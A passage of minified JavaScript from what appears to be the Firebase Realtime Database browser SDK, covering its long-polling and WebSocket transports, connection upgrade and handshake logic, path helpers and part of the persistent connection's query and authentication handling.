i.onClose&&(i.onClose(),i.onClose=null),"break";i.currentResponseNum++},i=this;this.pendingResponses[this.currentResponseNum]&&"break"!==r(););},it);function it(e){this.onMessage_=e,this.pendingResponses=[],this.currentResponseNum=0,this.closeAfterResponse=-1,this.onClose=null}var ot=(at.prototype.open=function(e,t){var n,r,i,o=this;this.curSegmentNum=0,this.onDisconnect_=t,this.myPacketOrderer=new rt(e),this.isClosed_=!1,this.connectTimeoutTimer_=setTimeout((function(){o.log_("Timed out trying to connect."),o.onClosed_(),o.connectTimeoutTimer_=null}),Math.floor(3e4)),n=function(){var e;o.isClosed_||(o.scriptTagHolder=new st((function(){for(var e=[],t=0;t<arguments.length;t++)e[t]=arguments[t];var n=u(e,5),r=n[0],i=n[1],a=n[2];if(n[3],n[4],o.incrementIncomingBytes_(e),o.scriptTagHolder)if(o.connectTimeoutTimer_&&(clearTimeout(o.connectTimeoutTimer_),o.connectTimeoutTimer_=null),o.everConnected_=!0,"start"===r)o.id=i,o.password=a;else{if("close"!==r)throw new Error("Unrecognized command received: "+r);i?(o.scriptTagHolder.sendNewPolls=!1,o.myPacketOrderer.closeAfter(i,(function(){o.onClosed_()}))):o.onClosed_()}}),(function(){for(var e=[],t=0;t<arguments.length;t++)e[t]=arguments[t];var n=(r=u(e,2))[0],r=r[1];o.incrementIncomingBytes_(e),o.myPacketOrderer.handleResponse(n,r)}),(function(){o.onClosed_()}),o.urlFn),(e={start:"t"}).ser=Math.floor(1e8*Math.random()),o.scriptTagHolder.uniqueCallbackIdentifier&&(e.cb=o.scriptTagHolder.uniqueCallbackIdentifier),e.v="5",o.transportSessionId&&(e.s=o.transportSessionId),o.lastSessionId&&(e.ls=o.lastSessionId),o.applicationId&&(e.p=o.applicationId),o.appCheckToken&&(e.ac=o.appCheckToken),"undefined"!=typeof location&&location.hostname&&Qe.test(location.hostname)&&(e.r="f"),e=o.urlFn(e),o.log_("Connecting via long-poll to "+e),o.scriptTagHolder.addTag(e,(function(){})))},"complete"===document.readyState?n():(r=!1,i=function(){document.body?r||(r=!0,n()):setTimeout(i,Math.floor(10))},document.addEventListener?(document.addEventListener("DOMContentLoaded",i,!1),window.addEventListener("load",i,!1)):document.attachEvent&&(document.attachEvent("onreadystatechange",(function(){"complete"===document.readyState&&i()})),window.attachEvent("onload",i)))},at.prototype.start=function(){this.scriptTagHolder.startLongPoll(this.id,this.password),this.addDisconnectPingFrame(this.id,this.password)},at.forceAllow=function(){at.forceAllow_=!0},at.forceDisallow=function(){at.forceDisallow_=!0},at.isAvailable=function(){return!!at.forceAllow_||!(at.forceDisallow_||"undefined"==typeof document||null==document.createElement||"object"==typeof window&&window.chrome&&window.chrome.extension&&!/^chrome/.test(window.location.href)||"object"==typeof Windows&&"object"==typeof Windows.UI)},at.prototype.markConnectionHealthy=function(){},at.prototype.shutdown_=function(){this.isClosed_=!0,this.scriptTagHolder&&(this.scriptTagHolder.close(),this.scriptTagHolder=null),this.myDisconnFrame&&(document.body.removeChild(this.myDisconnFrame),this.myDisconnFrame=null),this.connectTimeoutTimer_&&(clearTimeout(this.connectTimeoutTimer_),this.connectTimeoutTimer_=null)},at.prototype.onClosed_=function(){this.isClosed_||(this.log_("Longpoll is closing itself"),this.shutdown_(),this.onDisconnect_&&(this.onDisconnect_(this.everConnected_),this.onDisconnect_=null))},at.prototype.close=function(){this.isClosed_||(this.log_("Longpoll is being closed."),this.shutdown_())},at.prototype.send=function(e){e=N(e),this.bytesSent+=e.length,this.stats_.incrementCounter("bytes_sent",e.length);for(var t=_e(e=function(e){return e=h(e),y.encodeByteArray(e,!0)}(e),1840),n=0;n<t.length;n++)this.scriptTagHolder.enqueueSegment(this.curSegmentNum,t.length,t[n]),this.curSegmentNum++},at.prototype.addDisconnectPingFrame=function(e,t){this.myDisconnFrame=document.createElement("iframe");var n={dframe:"t"};n.id=e,n.pw=t,this.myDisconnFrame.src=this.urlFn(n),this.myDisconnFrame.style.display="none",document.body.appendChild(this.myDisconnFrame)},at.prototype.incrementIncomingBytes_=function(e){e=N(e).length,this.bytesReceived+=e,this.stats_.incrementCounter("bytes_received",e)},at);function at(e,t,n,r,i,o,a){var s=this;this.connId=e,this.repoInfo=t,this.applicationId=n,this.appCheckToken=r,this.authToken=i,this.transportSessionId=o,this.lastSessionId=a,this.bytesSent=0,this.bytesReceived=0,this.everConnected_=!1,this.log_=Ie(e),this.stats_=nt(t),this.urlFn=function(e){return s.appCheckToken&&(e.ac=s.appCheckToken),Je(t,Ke,e)}}var st=(ut.createIFrame_=function(){var e=document.createElement("iframe");if(e.style.display="none",!document.body)throw"Document body has not initialized. Wait to initialize Firebase until after the document is ready.";document.body.appendChild(e);try{e.contentWindow.document||Ee("No IE domain setting required")}catch(n){var t=document.domain;e.src="javascript:void((function(){document.open();document.domain='"+t+"';document.close();})())"}return e.contentDocument?e.doc=e.contentDocument:e.contentWindow?e.doc=e.contentWindow.document:e.document&&(e.doc=e.document),e},ut.prototype.close=function(){var e=this;this.alive=!1,this.myIFrame&&(this.myIFrame.doc.body.innerHTML="",setTimeout((function(){null!==e.myIFrame&&(document.body.removeChild(e.myIFrame),e.myIFrame=null)}),Math.floor(0)));var t=this.onDisconnect;t&&(this.onDisconnect=null,t())},ut.prototype.startLongPoll=function(e,t){for(this.myID=e,this.myPW=t,this.alive=!0;this.newRequest_(););},ut.prototype.newRequest_=function(){if(this.alive&&this.sendNewPolls&&this.outstandingRequests.size<(0<this.pendingSegs.length?2:1)){this.currentSerial++,(e={}).id=this.myID,e.pw=this.myPW,e.ser=this.currentSerial;for(var e=this.urlFn(e),t="",n=0;0<this.pendingSegs.length&&this.pendingSegs[0].d.length+30+t.length<=1870;){var r=this.pendingSegs.shift();t=t+"&seg"+n+"="+r.seg+"&ts"+n+"="+r.ts+"&d"+n+"="+r.d;n++}return this.addLongPollTag_(e+=t,this.currentSerial),!0}return!1},ut.prototype.enqueueSegment=function(e,t,n){this.pendingSegs.push({seg:e,ts:t,d:n}),this.alive&&this.newRequest_()},ut.prototype.addLongPollTag_=function(e,t){var n=this;function r(){n.outstandingRequests.delete(t),n.newRequest_()}this.outstandingRequests.add(t);var i=setTimeout(r,Math.floor(25e3));this.addTag(e,(function(){clearTimeout(i),r()}))},ut.prototype.addTag=function(e,t){var n=this;setTimeout((function(){try{if(!n.sendNewPolls)return;var r=n.myIFrame.doc.createElement("script");r.type="text/javascript",r.async=!0,r.src=e,r.onload=r.onreadystatechange=function(){var e=r.readyState;e&&"loaded"!==e&&"complete"!==e||(r.onload=r.onreadystatechange=null,r.parentNode&&r.parentNode.removeChild(r),t())},r.onerror=function(){Ee("Long-poll script failed to load: "+e),n.sendNewPolls=!1,n.close()},n.myIFrame.doc.body.appendChild(r)}catch(e){}}),Math.floor(1))},ut);function ut(e,t,n,r){this.onDisconnect=n,this.urlFn=r,this.outstandingRequests=new Set,this.pendingSegs=[],this.currentSerial=Math.floor(1e8*Math.random()),this.sendNewPolls=!0,this.uniqueCallbackIdentifier=we(),window["pLPCommand"+this.uniqueCallbackIdentifier]=e,window["pRTLPCB"+this.uniqueCallbackIdentifier]=t,this.myIFrame=ut.createIFrame_(),t="",t="<html><body>"+(t=this.myIFrame.src&&"javascript:"===this.myIFrame.src.substr(0,"javascript:".length)?'<script>document.domain="'+document.domain+'";<\/script>':t)+"</body></html>";try{this.myIFrame.doc.open(),this.myIFrame.doc.write(t),this.myIFrame.doc.close()}catch(e){Ee("frame writing exception"),e.stack&&Ee(e.stack),Ee(e)}}var lt=null;"undefined"!=typeof MozWebSocket?lt=MozWebSocket:"undefined"!=typeof WebSocket&&(lt=WebSocket);var ht=(ct.connectionURL_=function(e,t,n,r){var i={v:"5"};return"undefined"!=typeof location&&location.hostname&&Qe.test(location.hostname)&&(i.r="f"),t&&(i.s=t),n&&(i.ls=n),r&&(i.ac=r),Je(e,Ye,i)},ct.prototype.open=function(e,t){var n=this;this.onDisconnect=t,this.onMessage=e,this.log_("Websocket connecting to "+this.connURL),this.everConnected_=!1,ve.set("previous_websocket_failure",!0);try{C()||(r={headers:{"X-Firebase-GMPID":this.applicationId||"","X-Firebase-AppCheck":this.appCheckToken||""}},this.mySock=new lt(this.connURL,[],r))}catch(e){this.log_("Error instantiating WebSocket.");var r=e.message||e.data;return r&&this.log_(r),void this.onClosed_()}this.mySock.onopen=function(){n.log_("Websocket connected."),n.everConnected_=!0},this.mySock.onclose=function(){n.log_("Websocket connection was disconnected."),n.mySock=null,n.onClosed_()},this.mySock.onmessage=function(e){n.handleIncomingFrame(e)},this.mySock.onerror=function(e){n.log_("WebSocket error.  Closing connection."),(e=e.message||e.data)&&n.log_(e),n.onClosed_()}},ct.prototype.start=function(){},ct.forceDisallow=function(){ct.forceDisallow_=!0},ct.isAvailable=function(){var e,t=!1;return"undefined"!=typeof navigator&&navigator.userAgent&&(e=navigator.userAgent.match(/Android ([0-9]{0,}\.[0-9]{0,})/))&&1<e.length&&parseFloat(e[1])<4.4&&(t=!0),!t&&null!==lt&&!ct.forceDisallow_},ct.previouslyFailed=function(){return ve.isInMemoryStorage||!0===ve.get("previous_websocket_failure")},ct.prototype.markConnectionHealthy=function(){ve.remove("previous_websocket_failure")},ct.prototype.appendFrame_=function(e){this.frames.push(e),this.frames.length===this.totalFrames&&(e=this.frames.join(""),this.frames=null,e=P(e),this.onMessage(e))},ct.prototype.handleNewFrameCount_=function(e){this.totalFrames=e,this.frames=[]},ct.prototype.extractFrameCount_=function(e){if(f(null===this.frames,"We already have a frame buffer"),e.length<=6){var t=Number(e);if(!isNaN(t))return this.handleNewFrameCount_(t),null}return this.handleNewFrameCount_(1),e},ct.prototype.handleIncomingFrame=function(e){null!==this.mySock&&(e=e.data,this.bytesReceived+=e.length,this.stats_.incrementCounter("bytes_received",e.length),this.resetKeepAlive(),(null!==this.frames||null!==(e=this.extractFrameCount_(e)))&&this.appendFrame_(e))},ct.prototype.send=function(e){this.resetKeepAlive(),e=N(e),this.bytesSent+=e.length,this.stats_.incrementCounter("bytes_sent",e.length);var t=_e(e,16384);1<t.length&&this.sendString_(String(t.length));for(var n=0;n<t.length;n++)this.sendString_(t[n])},ct.prototype.shutdown_=function(){this.isClosed_=!0,this.keepaliveTimer&&(clearInterval(this.keepaliveTimer),this.keepaliveTimer=null),this.mySock&&(this.mySock.close(),this.mySock=null)},ct.prototype.onClosed_=function(){this.isClosed_||(this.log_("WebSocket is closing itself"),this.shutdown_(),this.onDisconnect&&(this.onDisconnect(this.everConnected_),this.onDisconnect=null))},ct.prototype.close=function(){this.isClosed_||(this.log_("WebSocket is being closed"),this.shutdown_())},ct.prototype.resetKeepAlive=function(){var e=this;clearInterval(this.keepaliveTimer),this.keepaliveTimer=setInterval((function(){e.mySock&&e.sendString_("0"),e.resetKeepAlive()}),Math.floor(45e3))},ct.prototype.sendString_=function(e){try{this.mySock.send(e)}catch(e){this.log_("Exception thrown from WebSocket.send():",e.message||e.data,"Closing connection."),setTimeout(this.onClosed_.bind(this),0)}},ct.responsesRequiredToBeHealthy=2,ct.healthyTimeout=3e4,ct);function ct(e,t,n,r,i,o,a){this.connId=e,this.applicationId=n,this.appCheckToken=r,this.authToken=i,this.keepaliveTimer=null,this.frames=null,this.totalFrames=0,this.bytesSent=0,this.bytesReceived=0,this.log_=Ie(this.connId),this.stats_=nt(t),this.connURL=ct.connectionURL_(t,o,a,r),this.nodeAdmin=t.nodeAdmin}var pt=(Object.defineProperty(dt,"ALL_TRANSPORTS",{get:function(){return[ot,ht]},enumerable:!1,configurable:!0}),dt.prototype.initTransports_=function(e){var t,n,r=ht&&ht.isAvailable(),i=r&&!ht.previouslyFailed();if(e.webSocketOnly&&(r||ke("wss:// URL used, but browser isn't known to support websockets.  Trying anyway."),i=!0),i)this.transports_=[ht];else{var o=this.transports_=[];try{for(var a=s(dt.ALL_TRANSPORTS),u=a.next();!u.done;u=a.next()){var l=u.value;l&&l.isAvailable()&&o.push(l)}}catch(e){t={error:e}}finally{try{u&&!u.done&&(n=a.return)&&n.call(a)}finally{if(t)throw t.error}}}},dt.prototype.initialTransport=function(){if(0<this.transports_.length)return this.transports_[0];throw new Error("No transports available")},dt.prototype.upgradeTransport=function(){return 1<this.transports_.length?this.transports_[1]:null},dt);function dt(e){this.initTransports_(e)}var ft=(_t.prototype.start_=function(){var e=this,t=this.transportManager_.initialTransport();this.conn_=new t(this.nextTransportId_(),this.repoInfo_,this.applicationId_,this.appCheckToken_,this.authToken_,null,this.lastSessionId),this.primaryResponsesRequired_=t.responsesRequiredToBeHealthy||0;var n=this.connReceiver_(this.conn_),r=this.disconnReceiver_(this.conn_);this.tx_=this.conn_,this.rx_=this.conn_,this.secondaryConn_=null,this.isHealthy_=!1,setTimeout((function(){e.conn_&&e.conn_.open(n,r)}),Math.floor(0)),0<(t=t.healthyTimeout||0)&&(this.healthyTimeout_=Ae((function(){e.healthyTimeout_=null,e.isHealthy_||(e.conn_&&102400<e.conn_.bytesReceived?(e.log_("Connection exceeded healthy timeout but has received "+e.conn_.bytesReceived+" bytes.  Marking connection healthy."),e.isHealthy_=!0,e.conn_.markConnectionHealthy()):e.conn_&&10240<e.conn_.bytesSent?e.log_("Connection exceeded healthy timeout but has sent "+e.conn_.bytesSent+" bytes.  Leaving connection alive."):(e.log_("Closing unhealthy connection after timeout."),e.close()))}),Math.floor(t)))},_t.prototype.nextTransportId_=function(){return"c:"+this.id+":"+this.connectionCount++},_t.prototype.disconnReceiver_=function(e){var t=this;return function(n){e===t.conn_?t.onConnectionLost_(n):e===t.secondaryConn_?(t.log_("Secondary connection lost."),t.onSecondaryConnectionLost_()):t.log_("closing an old connection")}},_t.prototype.connReceiver_=function(e){var t=this;return function(n){2!==t.state_&&(e===t.rx_?t.onPrimaryMessageReceived_(n):e===t.secondaryConn_?t.onSecondaryMessageReceived_(n):t.log_("message on old connection"))}},_t.prototype.sendRequest=function(e){this.sendData_({t:"d",d:e})},_t.prototype.tryCleanupConnection=function(){this.tx_===this.secondaryConn_&&this.rx_===this.secondaryConn_&&(this.log_("cleaning up and promoting a connection: "+this.secondaryConn_.connId),this.conn_=this.secondaryConn_,this.secondaryConn_=null)},_t.prototype.onSecondaryControl_=function(e){"t"in e&&("a"===(e=e.t)?this.upgradeIfSecondaryHealthy_():"r"===e?(this.log_("Got a reset on secondary, closing it"),this.secondaryConn_.close(),this.tx_!==this.secondaryConn_&&this.rx_!==this.secondaryConn_||this.close()):"o"===e&&(this.log_("got pong on secondary."),this.secondaryResponsesRequired_--,this.upgradeIfSecondaryHealthy_()))},_t.prototype.onSecondaryMessageReceived_=function(e){var t=fe("t",e);e=fe("d",e);if("c"===t)this.onSecondaryControl_(e);else{if("d"!==t)throw new Error("Unknown protocol layer: "+t);this.pendingDataMessages.push(e)}},_t.prototype.upgradeIfSecondaryHealthy_=function(){this.secondaryResponsesRequired_<=0?(this.log_("Secondary connection is healthy."),this.isHealthy_=!0,this.secondaryConn_.markConnectionHealthy(),this.proceedWithUpgrade_()):(this.log_("sending ping on secondary."),this.secondaryConn_.send({t:"c",d:{t:"p",d:{}}}))},_t.prototype.proceedWithUpgrade_=function(){this.secondaryConn_.start(),this.log_("sending client ack on secondary"),this.secondaryConn_.send({t:"c",d:{t:"a",d:{}}}),this.log_("Ending transmission on primary"),this.conn_.send({t:"c",d:{t:"n",d:{}}}),this.tx_=this.secondaryConn_,this.tryCleanupConnection()},_t.prototype.onPrimaryMessageReceived_=function(e){var t=fe("t",e);e=fe("d",e);"c"===t?this.onControl_(e):"d"===t&&this.onDataMessage_(e)},_t.prototype.onDataMessage_=function(e){this.onPrimaryResponse_(),this.onMessage_(e)},_t.prototype.onPrimaryResponse_=function(){this.isHealthy_||(this.primaryResponsesRequired_--,this.primaryResponsesRequired_<=0&&(this.log_("Primary connection is healthy."),this.isHealthy_=!0,this.conn_.markConnectionHealthy()))},_t.prototype.onControl_=function(e){var t=fe("t",e);if("d"in e)if(e=e.d,"h"===t)this.onHandshake_(e);else if("n"===t){this.log_("recvd end transmission on primary"),this.rx_=this.secondaryConn_;for(var n=0;n<this.pendingDataMessages.length;++n)this.onDataMessage_(this.pendingDataMessages[n]);this.pendingDataMessages=[],this.tryCleanupConnection()}else"s"===t?this.onConnectionShutdown_(e):"r"===t?this.onReset_(e):"e"===t?ce("Server Error: "+e):"o"===t?(this.log_("got pong on primary."),this.onPrimaryResponse_(),this.sendPingOnPrimaryIfNecessary_()):ce("Unknown control packet command: "+t)},_t.prototype.onHandshake_=function(e){var t=e.ts,n=e.v,r=e.h;this.sessionId=e.s,this.repoInfo_.host=r,0===this.state_&&(this.conn_.start(),this.onConnectionEstablished_(this.conn_,t),"5"!==n&&ke("Protocol version mismatch detected"),this.tryStartUpgrade_())},_t.prototype.tryStartUpgrade_=function(){var e=this.transportManager_.upgradeTransport();e&&this.startUpgrade_(e)},_t.prototype.startUpgrade_=function(e){var t=this;this.secondaryConn_=new e(this.nextTransportId_(),this.repoInfo_,this.applicationId_,this.appCheckToken_,this.authToken_,this.sessionId),this.secondaryResponsesRequired_=e.responsesRequiredToBeHealthy||0;var n=this.connReceiver_(this.secondaryConn_);e=this.disconnReceiver_(this.secondaryConn_);this.secondaryConn_.open(n,e),Ae((function(){t.secondaryConn_&&(t.log_("Timed out trying to upgrade."),t.secondaryConn_.close())}),Math.floor(6e4))},_t.prototype.onReset_=function(e){this.log_("Reset packet received.  New host: "+e),this.repoInfo_.host=e,1===this.state_?this.close():(this.closeConnections_(),this.start_())},_t.prototype.onConnectionEstablished_=function(e,t){var n=this;this.log_("Realtime connection established."),this.conn_=e,this.state_=1,this.onReady_&&(this.onReady_(t,this.sessionId),this.onReady_=null),0===this.primaryResponsesRequired_?(this.log_("Primary connection is healthy."),this.isHealthy_=!0):Ae((function(){n.sendPingOnPrimaryIfNecessary_()}),Math.floor(5e3))},_t.prototype.sendPingOnPrimaryIfNecessary_=function(){this.isHealthy_||1!==this.state_||(this.log_("sending ping on primary."),this.sendData_({t:"c",d:{t:"p",d:{}}}))},_t.prototype.onSecondaryConnectionLost_=function(){var e=this.secondaryConn_;this.secondaryConn_=null,this.tx_!==e&&this.rx_!==e||this.close()},_t.prototype.onConnectionLost_=function(e){this.conn_=null,e||0!==this.state_?1===this.state_&&this.log_("Realtime connection lost."):(this.log_("Realtime connection failed."),this.repoInfo_.isCacheableHost()&&(ve.remove("host:"+this.repoInfo_.host),this.repoInfo_.internalHost=this.repoInfo_.host)),this.close()},_t.prototype.onConnectionShutdown_=function(e){this.log_("Connection shutdown command received. Shutting down..."),this.onKill_&&(this.onKill_(e),this.onKill_=null),this.onDisconnect_=null,this.close()},_t.prototype.sendData_=function(e){if(1!==this.state_)throw"Connection is not connected";this.tx_.send(e)},_t.prototype.close=function(){2!==this.state_&&(this.log_("Closing realtime connection."),this.state_=2,this.closeConnections_(),this.onDisconnect_&&(this.onDisconnect_(),this.onDisconnect_=null))},_t.prototype.closeConnections_=function(){this.log_("Shutting down all connections"),this.conn_&&(this.conn_.close(),this.conn_=null),this.secondaryConn_&&(this.secondaryConn_.close(),this.secondaryConn_=null),this.healthyTimeout_&&(clearTimeout(this.healthyTimeout_),this.healthyTimeout_=null)},_t);function _t(e,t,n,r,i,o,a,s,u,l){this.id=e,this.repoInfo_=t,this.applicationId_=n,this.appCheckToken_=r,this.authToken_=i,this.onMessage_=o,this.onReady_=a,this.onDisconnect_=s,this.onKill_=u,this.lastSessionId=l,this.connectionCount=0,this.pendingDataMessages=[],this.state_=0,this.log_=Ie("c:"+this.id+":"),this.transportManager_=new pt(t),this.log_("Connection created"),this.start_()}var yt=(vt.prototype.put=function(e,t,n,r){},vt.prototype.merge=function(e,t,n,r){},vt.prototype.refreshAuthToken=function(e){},vt.prototype.refreshAppCheckToken=function(e){},vt.prototype.onDisconnectPut=function(e,t,n){},vt.prototype.onDisconnectMerge=function(e,t,n){},vt.prototype.onDisconnectCancel=function(e,t){},vt.prototype.reportStats=function(e){},vt);function vt(){}var gt=(mt.prototype.trigger=function(e){for(var t=[],n=1;n<arguments.length;n++)t[n-1]=arguments[n];if(Array.isArray(this.listeners_[e]))for(var r=l([],u(this.listeners_[e])),i=0;i<r.length;i++)r[i].callback.apply(r[i].context,t)},mt.prototype.on=function(e,t,n){this.validateEventType_(e),this.listeners_[e]=this.listeners_[e]||[],this.listeners_[e].push({callback:t,context:n}),(e=this.getInitialEvent(e))&&t.apply(n,e)},mt.prototype.off=function(e,t,n){this.validateEventType_(e);for(var r=this.listeners_[e]||[],i=0;i<r.length;i++)if(r[i].callback===t&&(!n||n===r[i].context))return void r.splice(i,1)},mt.prototype.validateEventType_=function(e){f(this.allowedEvents_.find((function(t){return t===e})),"Unknown event: "+e)},mt);function mt(e){this.allowedEvents_=e,this.listeners_={},f(Array.isArray(e)&&0<e.length,"Requires a non-empty array")}var wt,Ct=(r(bt,wt=gt),bt.getInstance=function(){return new bt},bt.prototype.getInitialEvent=function(e){return f("online"===e,"Unknown event type: "+e),[this.online_]},bt.prototype.currentlyOnline=function(){return this.online_},bt);function bt(){var e=wt.call(this,["online"])||this;return e.online_=!0,"undefined"==typeof window||void 0===window.addEventListener||w()||(window.addEventListener("online",(function(){e.online_||(e.online_=!0,e.trigger("online",!0))}),!1),window.addEventListener("offline",(function(){e.online_&&(e.online_=!1,e.trigger("online",!1))}),!1)),e}var Tt=(Et.prototype.toString=function(){for(var e="",t=this.pieceNum_;t<this.pieces_.length;t++)""!==this.pieces_[t]&&(e+="/"+this.pieces_[t]);return e||"/"},Et);function Et(e,t){if(void 0===t){this.pieces_=e.split("/");for(var n=0,r=0;r<this.pieces_.length;r++)0<this.pieces_[r].length&&(this.pieces_[n]=this.pieces_[r],n++);this.pieces_.length=n,this.pieceNum_=0}else this.pieces_=e,this.pieceNum_=t}function It(){return new Tt("")}function St(e){return e.pieceNum_>=e.pieces_.length?null:e.pieces_[e.pieceNum_]}function kt(e){return e.pieces_.length-e.pieceNum_}function Pt(e){var t=e.pieceNum_;return t<e.pieces_.length&&t++,new Tt(e.pieces_,t)}function Nt(e){return e.pieceNum_<e.pieces_.length?e.pieces_[e.pieces_.length-1]:null}function xt(e,t){return e.pieces_.slice(e.pieceNum_+(t=void 0===t?0:t))}function Rt(e){if(e.pieceNum_>=e.pieces_.length)return null;for(var t=[],n=e.pieceNum_;n<e.pieces_.length-1;n++)t.push(e.pieces_[n]);return new Tt(t,0)}function Ot(e,t){for(var n=[],r=e.pieceNum_;r<e.pieces_.length;r++)n.push(e.pieces_[r]);if(t instanceof Tt)for(r=t.pieceNum_;r<t.pieces_.length;r++)n.push(t.pieces_[r]);else{var i=t.split("/");for(r=0;r<i.length;r++)0<i[r].length&&n.push(i[r])}return new Tt(n,0)}function Dt(e){return e.pieceNum_>=e.pieces_.length}function At(e,t){var n=St(e),r=St(t);if(null===n)return t;if(n===r)return At(Pt(e),Pt(t));throw new Error("INTERNAL ERROR: innerPath ("+t+") is not within outerPath ("+e+")")}function Lt(e,t){for(var n=xt(e,0),r=xt(t,0),i=0;i<n.length&&i<r.length;i++){var o=xe(n[i],r[i]);if(0!==o)return o}return n.length===r.length?0:n.length<r.length?-1:1}function Mt(e,t){if(kt(e)!==kt(t))return!1;for(var n=e.pieceNum_,r=t.pieceNum_;n<=e.pieces_.length;n++,r++)if(e.pieces_[n]!==t.pieces_[r])return!1;return!0}function Ft(e,t){var n=e.pieceNum_,r=t.pieceNum_;if(kt(e)>kt(t))return!1;for(;n<e.pieces_.length;){if(e.pieces_[n]!==t.pieces_[r])return!1;++n,++r}return!0}var qt=function(e,t){this.errorPrefix_=t,this.parts_=xt(e,0),this.byteLength_=Math.max(1,this.parts_.length);for(var n=0;n<this.parts_.length;n++)this.byteLength_+=U(this.parts_[n]);Wt(this)};function Wt(e){if(e.byteLength_>768)throw new Error(e.errorPrefix_+"has a key path longer than 768 bytes ("+e.byteLength_+").");if(e.parts_.length>32)throw new Error(e.errorPrefix_+"path specified exceeds the maximum depth that can be written (32) or object contains a cycle "+jt(e))}function jt(e){return 0===e.parts_.length?"":"in property '"+e.parts_.join(".")+"'"}var Ut,Bt=(r(zt,Ut=gt),zt.getInstance=function(){return new zt},zt.prototype.getInitialEvent=function(e){return f("visible"===e,"Unknown event type: "+e),[this.visible_]},zt);function zt(){var e,t,n=Ut.call(this,["visible"])||this;return"undefined"!=typeof document&&void 0!==document.addEventListener&&(void 0!==document.hidden?(t="visibilitychange",e="hidden"):void 0!==document.mozHidden?(t="mozvisibilitychange",e="mozHidden"):void 0!==document.msHidden?(t="msvisibilitychange",e="msHidden"):void 0!==document.webkitHidden&&(t="webkitvisibilitychange",e="webkitHidden")),n.visible_=!0,t&&document.addEventListener(t,(function(){var t=!document[e];t!==n.visible_&&(n.visible_=t,n.trigger("visible",t))}),!1),n}var Vt,Ht=1e3,Qt=(r(Yt,Vt=yt),Yt.prototype.sendRequest=function(e,t,n){var r=++this.requestNumber_;t={r:r,a:e,b:t};this.log_(N(t)),f(this.connected_,"sendRequest call when we're not connected not allowed."),this.realtime_.sendRequest(t),n&&(this.requestCBHash_[r]=n)},Yt.prototype.get=function(e){var t=this;this.initConnection_();var n=new g,r={p:e._path.toString(),q:e._queryObject},i={action:"g",request:r,onComplete:function(e){var i=e.d;"ok"===e.s?(t.onDataUpdate_(r.p,i,!1,null),n.resolve(i)):n.reject(i)}};this.outstandingGets_.push(i),this.outstandingGetCount_++;var o=this.outstandingGets_.length-1;return this.connected_||setTimeout((function(){var e=t.outstandingGets_[o];void 0!==e&&i===e&&(delete t.outstandingGets_[o],t.outstandingGetCount_--,0===t.outstandingGetCount_&&(t.outstandingGets_=[]),t.log_("get "+o+" timed out on connection"),n.reject(new Error("Client is offline.")))}),3e3),this.connected_&&this.sendGet_(o),n.promise},Yt.prototype.listen=function(e,t,n,r){this.initConnection_();var i=e._queryIdentifier,o=e._path.toString();this.log_("Listen called for "+o+" "+i),this.listens.has(o)||this.listens.set(o,new Map),f(e._queryParams.isDefault()||!e._queryParams.loadsAllData(),"listen() called for non-default but complete query"),f(!this.listens.get(o).has(i),"listen() called twice for same path/queryId."),n={onComplete:r,hashFn:t,query:e,tag:n},this.listens.get(o).set(i,n),this.connected_&&this.sendListen_(n)},Yt.prototype.sendGet_=function(e){var t=this,n=this.outstandingGets_[e];this.sendRequest("g",n.request,(function(r){delete t.outstandingGets_[e],t.outstandingGetCount_--,0===t.outstandingGetCount_&&(t.outstandingGets_=[]),n.onComplete&&n.onComplete(r)}))},Yt.prototype.sendListen_=function(e){var t=this,n=e.query,r=n._path.toString(),i=n._queryIdentifier;this.log_("Listen on "+r+" for "+i);var o={p:r};e.tag&&(o.q=n._queryObject,o.t=e.tag),o.h=e.hashFn(),this.sendRequest("q",o,(function(o){var a=o.d,s=o.s;Yt.warnOnListenWarnings_(a,n),(t.listens.get(r)&&t.listens.get(r).get(i))===e&&(t.log_("listen response",o),"ok"!==s&&t.removeListen_(r,i),e.onComplete&&e.onComplete(s,a))}))},Yt.warnOnListenWarnings_=function(e,t){e&&"object"==typeof e&&R(e,"w")&&(e=O(e,"w"),Array.isArray(e)&&~e.indexOf("no_index")&&(e='".indexOn": "'+t._queryParams.getIndex().toString()+'"',t=t._path.toString(),ke("Using an unspecified index. Your data will be downloaded and filtered on the client. Consider adding "+e+" at "+t+" to your security rules for better performance.")))},Yt.prototype.refreshAuthToken=function(e){this.authToken_=e,this.log_("Auth token refreshed"),this.authToken_?this.tryAuth():this.connected_&&this.sendRequest("unauth",{},(function(){})),this.reduceReconnectDelayIfAdminCredential_(e)},Yt.prototype.reduceReconnectDelayIfAdminCredential_=function(e){(e&&40===e.length||function(e){return"object"==typeof(e=x(e).claims)&&!0===e.admin}(e))&&(this.log_("Admin auth credential detected.  Reducing max reconnect time."),this.maxReconnectDelay_=3e4)},Yt.prototype.refreshAppCheckToken=function(e){this.appCheckToken_=e,this.log_("App check token refreshed"),this.appCheckToken_?this.tryAppCheck():this.connected_&&this.sendRequest("unappeck",{},(function(){}))},Yt.prototype.tryAuth=function(){var e,t,n,r=this;this.connected_&&this.authToken_&&(t=function(e){return!!(e=x(e).claims)&&"object"==typeof e&&e.hasOwnProperty("iat")}(e=this.authToken_)?"auth":"gauth",n={cred:e},null===this.authOverride_?n.noauth=!0:"object"==typeof this.authOverride_&&(n.authvar=this.authOverride_),this.sendRequest(t,n,(function(t){var n=t.s;t=t.d||"error";r.authToken_===e&&("ok"===n?r.invalidAuthTokenCount_=0:r.onAuthRevoked_(n,t))})))},Yt.prototype.tryAppCheck=function(){var e=this;this.connected_&&this.appCheckToken_&&this.sendRequest("appcheck",{token:this.appCheckToken_},(function(t){var n=t.s;t=t.d||"error";"ok"===n?e.invalidAppCheckTokenCount_=0:e.onAppCheckRevoked_(n,t)}))},Yt.prototype.unlisten=function(e,t){var n=e._path.toString(),r=e._queryIdentifier;this.log_("Unlisten called for "+n+" "+r),f(e._queryParams.isDefault()||!e._queryParams.loadsAllData(),"unlisten() called for non-default but complete query"),this.removeListen_(n,r)&&this.connected_&&this.sendUnlisten_(n,r,e._queryObject,t)},Yt.prototype.sendUnlisten_=function(e,t,n,r){this.log_("Unlisten on "+e+" for 